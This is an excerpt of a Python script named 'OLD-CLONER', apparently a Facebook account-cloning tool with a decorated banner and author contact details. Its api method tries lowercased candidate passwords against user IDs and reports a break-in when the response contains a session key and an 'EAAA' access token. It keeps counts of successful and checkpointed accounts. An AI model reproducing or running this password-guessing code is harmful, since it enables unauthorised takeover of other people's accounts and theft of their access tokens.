...
class Main:
	def __init__(self):
		...
		print ("""    
\033[1;91m    _____ ___   _   _    ___ ________  ___
\033[1;93m   |_   _/ _ \ | \ | |  |_  |_   _|  \/  |
 \033[1;92m    | |/ /_\ \|  \| |    | | | | | .  . |
 \033[1;91m    | ||  _  || . ` |    | | | | | |\/| |
\033[1;92m     | || | | || |\  |/\__/ /_| |_| |  | |
\033[1;93m     \_/\_| |_/\_| \_/\____/ \___/\_|  |_/
                                     
    
 鈹� [鉁揮 AUTHOR   : TANJIM            鈹�
 鈹� [鉁揮 GITHUB   : TANJIM-143        鈹�
 鈹� [鉁揮 WHATSAPP : +8801316113328    鈹�
 鈹� [鉁揮 POWER BY : \x1b[1;32mAFRIDE\x1b[1;97m            鈹�
\033[1;92m_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_""")
		print("%s [%s庐%s] %sTOOL NAME : %sOLD-CLONER"%(G,R,G,Y,G))
		print("%s [%s庐%s] %sVERSION   : %s2.0 "%(G,R,G,Y,G))
		print("%s [%s庐%s] %sSTATUS    : %sF R E E"%(G,R,G,Y,G)) 
 
		print("\033[97;1m鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹")
		print("\033[92;1m        AUTHOR : TANJIM AFRIDE      ")
		print("\033[97;1m鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹")
		...
		print("%s [%s7%s]%s FOLLOW ME ON GitHub %s"%(G,R,G,Y,G))
		print("\033[97;1m鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://github.com/TANJIM-143')
		else:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[SNIGDHO馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SNIGDHO-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
